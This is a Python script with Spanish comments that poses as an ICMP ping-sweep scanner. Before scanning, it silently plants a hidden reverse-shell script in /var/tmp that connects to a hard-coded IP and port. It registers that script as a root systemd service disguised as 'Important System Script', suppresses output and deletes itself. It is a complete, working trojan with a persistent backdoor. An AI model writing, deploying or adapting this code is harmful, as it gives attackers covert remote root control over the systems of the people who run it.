#!/usr/bin/env python3

import os
import subprocess
import sys
import signal
from concurrent.futures import ThreadPoolExecutor
import time
import socket

def def_handler(sig, frame):
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)  # Capturar Ctrl+C

def check_root():
    """Verificar si el script se está ejecutando como root."""
    if os.geteuid() != 0:
        sys.exit("Este script debe ser ejecutado como root.")

def copy_to_hidden_location():
    """Copiar el script para establecer la conexión a una ubicación oculta."""
    connection_script_content = '''#!/usr/bin/env python3

import socket
import subprocess
import time

def run_command(command):
    """Ejecutar un comando en el sistema."""
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("utf-8").strip()
    except subprocess.CalledProcessError as e:
        return f"Error ejecutando el comando: {e.output.decode('utf-8').strip()}"
    except Exception as e:
        return f"Error inesperado: {str(e)}"

def start_reverse_shell():
    """Iniciar una shell inversa."""
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect(("10.120.0.191", 4100))  # Cambia esto a tu IP y puerto
                
                while True:
                    command = client_socket.recv(1024).decode().strip()
                    if not command:
                        break
                    
                    command_output = run_command(command)
                    client_socket.send(command_output.encode("utf-8") + b"\\n")
                
        except (ConnectionRefusedError, ConnectionResetError):
            time.sleep(30)  # Esperar 30 segundos antes de reintentar la conexión
        except Exception:
            time.sleep(30)

if __name__ == '__main__':
    start_reverse_shell()  # Ejecutar la shell inversa
'''

    # Guardar el script en /var/tmp/.important-system.py
    dest_path = '/var/tmp/.important-system.py'
    try:
        with open(dest_path, 'w') as script_file:
            script_file.write(connection_script_content)
        os.chmod(dest_path, 0o755)  # Establecer permisos de ejecución
    except Exception as e:
        print(f"Error al copiar el script de conexión en {dest_path}: {e}")

def create_systemd_service():
    """Crear un servicio de systemd para ejecutar el script de conexión."""
    service_content = """[Unit]
Description=Important System Script
After=network.target

[Service]
ExecStart=/usr/bin/python3 /var/tmp/.important-system.py
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
"""
    service_path = '/etc/systemd/system/important-system.service'

    try:
        with open(service_path, 'w') as service_file:
            service_file.write(service_content)

        subprocess.run(['systemctl', 'daemon-reload'], check=True)  # Recargar configuraciones de systemd
        subprocess.run(['systemctl', 'enable', 'important-system.service'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Habilitar el servicio sin mostrar mensajes

        # Iniciar el servicio inmediatamente
        subprocess.run(['systemctl', 'start', 'important-system.service'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Iniciar el servicio sin mostrar mensajes

    except Exception as e:
        print(f"Error al crear el archivo del servicio: {e}")

def save_icmp_scanner():
    """Definir el escáner ICMP en el mismo script."""
    target_str = input("Ingresa el host o rango a escanear (ej. 192.168.1.1-100): ")
    
    target_str_splitted = target_str.split('.')  # ["192", "168", "1", "1-100"]
    first_three_octets = '.'.join(target_str_splitted[:3])  # "192.168.1"

    if len(target_str_splitted) == 4:
        if "-" in target_str_splitted[3]:
            start, end = target_str_splitted[3].split('-')
            targets = [f"{first_three_octets}.{i}" for i in range(int(start), int(end) + 1)]
        else:
            targets = [target_str]
    else:
        print("[!] Formato incorrecto")
        return

    max_threads = 100

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for target in targets:
            executor.submit(host_discovery, target)

def host_discovery(target):
    """Descubrir hosts activos en la red."""
    try:
        ping = subprocess.run(["ping", "-c", "1", target], timeout=1, stdout=subprocess.DEVNULL)
        if ping.returncode == 0:
            print(f"[+] {target} - ACTIVO")
    except subprocess.TimeoutExpired:
        pass

def self_destruct():
    """Autodestruir el script original."""
    script_path = os.path.abspath(sys.argv[0])
    try:
        os.remove(script_path)
    except Exception as e:
        print(f"Error al autodestruir el script original: {e}")

def main():
    check_root()  # Verificar
    copy_to_hidden_location()
    create_systemd_service()
    save_icmp_scanner()  # Ejecutar

    self_destruct()  # Autodestruir

if __name__ == '__main__':
    main()

